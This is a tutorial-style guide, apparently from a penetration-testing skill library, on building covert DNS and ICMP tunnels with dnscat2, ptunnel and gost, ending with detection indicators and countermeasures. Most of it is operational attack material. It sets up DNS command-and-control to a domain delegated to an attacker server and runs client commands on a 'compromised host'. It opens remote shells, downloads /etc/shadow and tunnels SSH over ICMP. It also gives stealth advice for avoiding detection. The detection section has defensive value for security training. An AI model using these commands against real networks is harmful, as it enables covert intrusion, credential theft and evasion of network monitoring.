# DNS and ICMP Covert Tunnels

> Guide to constructing covert communication channels over DNS and ICMP protocols when TCP/UDP egress is blocked. Covers dnscat2 for DNS C2 tunnels, ptunnel for ICMP tunneling, gost for multi-protocol tunnels, and detection methods for each covert channel type.

## Introduction and Objectives

When firewalls block all outbound TCP and UDP traffic, DNS and ICMP protocols often remain permitted for basic network functionality (name resolution and diagnostics). Covert tunneling exploits these permitted channels to establish bidirectional communication paths that bypass egress filtering. This guide covers the primary covert tunneling tools and techniques, from DNS-based C2 channels to ICMP encapsulation, along with detection methods for each tunnel type.

**Learning objectives**:

- Set up and operate dnscat2 for encrypted C2 communication over DNS
- Establish ICMP tunnels with ptunnel when only ping traffic is allowed
- Use gost for multi-protocol tunneling with protocol chaining
- Understand the detection indicators that expose DNS and ICMP tunnels
- Apply defensive countermeasures against covert channel usage

**Prerequisites**: An authoritative DNS zone for dnscat2 setup. A VPS or reachable server for tunnel endpoints. Root/sudo access on both tunnel endpoints. Understanding of DNS query/response mechanics and ICMP echo behavior.

## 1. Dnscat2 -- DNS-Based Command and Control Tunnel

Dnscat2 creates a fully encrypted, bidirectional command-and-control channel that operates entirely over DNS queries and responses. It supports interactive shells, file transfers, and port forwarding -- all encapsulated in DNS traffic to a domain you control.

**Prerequisites**: An authoritative DNS zone for a domain you control. You must delegate a subdomain (e.g., `tunnel.example.com`) to a nameserver running dnscat2. The target network must allow outbound DNS queries to the internet.

**DNS infrastructure setup**:

1. Register a domain or use an existing one
2. Create an NS record: `tunnel.example.com NS ns1.attacker-vps.com`
3. Run dnscat2 on the VPS, listening on port 53 for DNS queries
4. The dnscat2 client on the target sends encoded data as DNS queries to `tunnel.example.com`
5. Responses carry data back encoded in DNS record fields (TXT, CNAME, MX)

```bash
# Start dnscat2 server with a shared secret
ruby ./dnscat2.rb --secret=MySecretKey123 tunnel.example.com

# Start dnscat2 server in relay mode (for when you cannot bind port 53)
ruby ./dnscat2.rb --dns:host=0.0.0.0,port=53531 --secret=MySecretKey123

# Client on compromised host (connects via DNS)
./dnscat --secret=MySecretKey123 tunnel.example.com

# Client using specific DNS server (if default resolver is restricted)
./dnscat --secret=MySecretKey123 --dns 8.8.8.8 tunnel.example.com
```

**Dnscat2 session operations**:

```
# List active sessions
dnscat2> sessions

# Interact with a session
dnscat2> session -i 1

# Open a remote shell
dnscat2> shell

# Download a file from the target
dnscat2> download /etc/shadow /tmp/shadow.dump

# Upload a file to the target
dnscat2> upload /tmp/tool.exe C:\temp\tool.exe

# Create a port forward tunnel
dnscat2> tunnel create --host=127.0.0.1 --port=8888
# Then on the client side, connect to localhost:8888 to reach the tunneled port

# Execute a command
dnscat2> exec whoami
```

**Performance characteristics**: DNS tunnels are slow. Expect 1-50 KB/s depending on DNS query frequency and record type limits. TXT records carry more data per query than CNAME. Use for C2 communication and small file transfers, not bulk data movement.

**Stealth considerations**: Dnscat2 generates DNS queries at regular intervals. High-frequency queries to a single domain are a detection signal. Use `--delay` to increase query intervals at the cost of throughput. Avoid obvious subdomain names. Combine with legitimate DNS traffic to mask the pattern.

## 2. Ptunnel -- ICMP Echo Tunnel

Ptunnel encapsulates TCP connections inside ICMP echo request and reply packets. When a firewall blocks all TCP and UDP outbound traffic but allows ICMP (ping), ptunnel provides a reliable tunnel path.

```bash
# Ptunnel server on a host reachable via ICMP (VPS or pivot)
sudo ptunnel -x secretpassword

# Ptunnel client on compromised host
# Creates local listener on port 2222 that tunnels to target:22 via ICMP relay
sudo ptunnel -p relay.example.com -lp 2222 -da target-host -dp 22 -x secretpassword

# SSH through the ICMP tunnel
ssh -p 2222 user@127.0.0.1

# Tunnel arbitrary TCP service (e.g., HTTP to internal server)
sudo ptunnel -p relay.example.com -lp 8080 -da internal-web -dp 80 -x secretpassword
curl http://127.0.0.1:8080
```

**How it works**: The ptunnel client encodes TCP data into the payload of ICMP echo requests sent to the relay host. The relay extracts the data and forwards it to the target. Return traffic is encoded in ICMP echo replies. To network monitoring, the traffic looks like normal ping traffic.

**Performance**: ICMP tunnels are slower than DNS tunnels. Typical throughput is 1-10 KB/s. ICMP packets have limited payload size (typically 64-1500 bytes depending on MTU). Use for interactive shells and small file transfers only.

**Limitations**: Requires raw socket capability (root/sudo) on both ends. Some networks strip ICMP payloads or limit ICMP packet size. Asymmetric ICMP handling (different MTU for echo vs reply) can cause fragmentation issues.

## 3. Gost -- Multi-Protocol Tunneling

Gost is a versatile tunneling tool that supports HTTP, HTTPS, SOCKS5, Shadowsocks, QUIC, and other protocols. It can chain tunnels across multiple protocols, making it ideal for building covert paths that blend different traffic types.

```bash
# HTTP tunnel server
gost -L http://:8080

# SOCKS5 proxy
gost -L socks5://:1080

# TLS-encrypted tunnel (looks like HTTPS)
gost -L tls://:443

# QUIC tunnel (UDP-based, evades TCP inspection)
gost -L quic://:443

# Shadowsocks tunnel (encrypted, looks like random traffic)
gost -L ss://chacha20-ietf-poly1305:password@:8338

# Chained tunnel: client -> HTTP -> TLS -> SOCKS5 -> target
gost -L :8080 -F http://proxy1:8080 -F tls://proxy2:443 -F socks5://proxy3:1080

# gost as a relay between two different tunnel types
gost -L tls://:443 -F quic://internal-relay:443
```

**Protocol selection strategy**: Use HTTP/TLS when web traffic is allowed. Use QUIC when TCP is blocked but UDP is allowed (QUIC runs over UDP). Use Shadowsocks when you need encryption that looks like random traffic without TLS handshake signatures. Chain protocols to match the allowed outbound traffic at each network segment.

## 4. Detecting Covert Channels

Understanding detection methods helps build more stealthy tunnels during testing and enables defenders to identify covert channel usage.

### DNS Tunnel Detection Indicators

- **Query length**: Legitimate DNS queries are typically short (< 30 characters). Tunnel queries often exceed 60 characters per label.
- **Query frequency**: Tunnels generate consistent, high-frequency queries. Normal DNS is bursty with idle periods.
- **Record type**: TXT and NULL record queries are unusual for normal DNS usage. CNAME responses with long values are suspicious.
- **Entropy**: Subdomain labels in tunnel queries have high entropy (encoded binary data). Normal subdomain labels are low-entropy words.
- **Volume**: A single host generating thousands of queries per day to one domain is anomalous.

### ICMP Tunnel Detection Indicators

- **Payload size**: Normal ping payloads are 56-64 bytes. ICMP tunnel payloads are typically near MTU (1400+ bytes).
- **Payload content**: Normal ICMP payloads contain predictable patterns (padding with 0x00-0x10). Tunnel payloads contain high-entropy data.
- **Frequency**: Consistent ICMP traffic at regular intervals to a single host is unusual for normal operations.
- **Timing**: Tunnels create ICMP traffic with timing patterns matching TCP ACK behavior (burst patterns rather than single pings).

### Detection Tools

```bash
# Monitor DNS query lengths for tunnel indicators
tcpdump -i eth0 -nn port 53 -l | awk '{print length}' | sort -rn | head -20

# Check ICMP payload sizes
tcpdump -i eth0 -nn icmp -vv | grep "length"

# Monitor DNS query frequency per domain
tcpdump -i eth0 -nn port 53 -l 2>/dev/null | \
  grep -oP 'A\s+\K[^.]+' | sort | uniq -c | sort -rn | head

# Suricata/Snort rules for DNS tunnel detection (example)
# alert udp any any -> any 53 (msg:"DNS tunnel long label"; \
#   content:"|00|"; offset:12; depth:1; \
#   pcre:"/\.(?:[a-z0-9]{50,})/i"; sid:1000001;)
```

### Defensive Countermeasures

- **DNS**: Limit query label length to 40 characters. Restrict DNS resolution to approved recursive resolvers. Block TXT and NULL queries to external resolvers. Deploy DNS monitoring with entropy analysis.
- **ICMP**: Block outbound ICMP echo to external hosts. Rate-limit ICMP traffic. Inspect ICMP payloads for anomalous content. Block ICMP packets with payloads exceeding 128 bytes.
- **General**: Deploy network behavior analysis to baseline traffic patterns and detect anomalies. Implement strict egress filtering. Use deep packet inspection for all permitted outbound protocols.

## Hands-on Exercise: Covert Channel Construction

Practice building and detecting DNS and ICMP covert tunnels:

**Setup**:

```bash
# You need two machines: one as the tunnel server (VPS), one as the client
# For DNS tunneling: a domain with authoritative DNS delegation to your server
# For ICMP tunneling: root access on both machines
```

**Exercise steps**:

1. Configure DNS delegation for a subdomain pointing to your VPS
2. Start dnscat2 server on the VPS and connect from the client
3. Open an interactive shell session through the DNS tunnel and execute commands
4. Transfer a small file (< 100KB) through the DNS tunnel and measure throughput
5. Set up ptunnel on both machines and establish an SSH connection through the ICMP tunnel
6. Use gost to create a multi-protocol tunnel chain (e.g., DNS to TLS to SOCKS)
7. Capture tunnel traffic with tcpdump and analyze it to identify detection indicators
8. Write detection rules (Snort/Suricata format) for DNS and ICMP tunnel patterns

**Validation criteria**: Successfully establish both DNS and ICMP tunnels. Execute commands through each tunnel type. Identify at least three detection indicators per tunnel type from captured traffic.

## References and Resources

- **dns-attacks skill** -- Full DNS attack toolkit including dns2tcp and iodine for additional DNS tunneling options
- **ssh-http-tunneling-pivoting.md** -- For TCP-based tunnels when DNS/ICMP is not necessary
- **socks-proxy-chain-traffic.md** -- For wrapping these covert tunnels in additional proxy and TLS layers
- [dnscat2 GitHub Repository](https://github.com/iagox86/dnscat2)
- [ptunnel GitHub Repository](https://github.com/espeon/ptunnel)
- [gost GitHub Repository](https://github.com/ginuerzh/gost)
- [SANS - Detecting DNS Tunnels](https://www.sans.org/white-papers/detecting-dns-tunneling/)
